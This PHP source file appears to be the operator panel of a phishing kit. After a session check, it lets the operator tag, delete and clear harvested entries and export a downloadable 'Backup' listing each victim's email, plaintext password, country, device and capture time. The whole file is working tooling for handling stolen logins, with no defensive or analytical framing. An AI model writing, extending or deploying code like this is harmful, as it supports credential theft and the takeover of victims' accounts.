<?
session_start();
include_once "sql.php";
$login=isset($_SESSION['login'])?$_SESSION['login']:0;
$lastTime=isset($_SESSION['time'])?$_SESSION['time']:0;
if(time()-$lastTime>1200) $login=0;
if($login==0)
{
    die("error");
}
$ac=(isset($_GET['ac']))?$_GET['ac']:"";
if($ac=="typenick")
{
    $id=(isset($_GET['id']))?$_GET['id']:"";
    $type=(isset($_GET['type']))?$_GET['type']:"";
    modifyNick($id,"type",$type); 
    echo "OK";   
}else if($ac=="xoanick"){
    $id=(isset($_GET['id']))?$_GET['id']:"";
    deleteNick($id);
    echo "OK";
}else if($ac=="type")
{
    $mac=(isset($_GET['mac']))?$_GET['mac']:"";
    if($mac=="edit")
    {
        $id=(isset($_GET['id']))?$_GET['id']:"";
        $name=(isset($_GET['name']))?$_GET['name']:"";
        
        $color=(isset($_GET['color']))?$_GET['color']:"";
        $color=str_replace("pp","#",$color);
        modifyType($id,"name",$name);
        modifyType($id,"color",$color);
    }else if($mac=="add")
    {
       
        $name=(isset($_GET['name']))?$_GET['name']:"";
        
        $color=(isset($_GET['color']))?$_GET['color']:"";
        $color=str_replace("pp","#",$color);
        $type=array();
        $type['name']=$name;
        $type['color']=$color;
        addType($type);
    }
}else if($ac=="export")
{
   
    date_default_timezone_set('Asia/Ho_Chi_Minh');
    $date=Date('d/m/Y-H:i:s');
    $time=Date('d-m-Y');
    $url="http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
    $nick=readNick();
    $r="Backup - ".$date;
    $br="\r\n";
    $r.=$br."Source: ".$url;
    
    $r.=$br.$br."Nick - Pass - Country - Device - Time";
    $r.=$br.$br;
    for($i=0;$i<count($nick);$i++)
    {
        $mnick=$nick[$i];
        $space="-";
        $mobile=($mnick['mobile']==1)?"mobile":"web";
        $date=Date('d/m/Y_H:i:s',$mnick['time']);
        $r.=$br.$mnick['email'].$space.$mnick['pass'].$space.$mnick['country'].$space.$mobile.$space.$date;
        
    }
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename=NT '.$time.".txt");
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    echo $r;
    exit;
}else if($ac=="clear")
{
    $nick=array();
    writeNick($nick);
    header("Location: setting.php?ac=view");
}
?>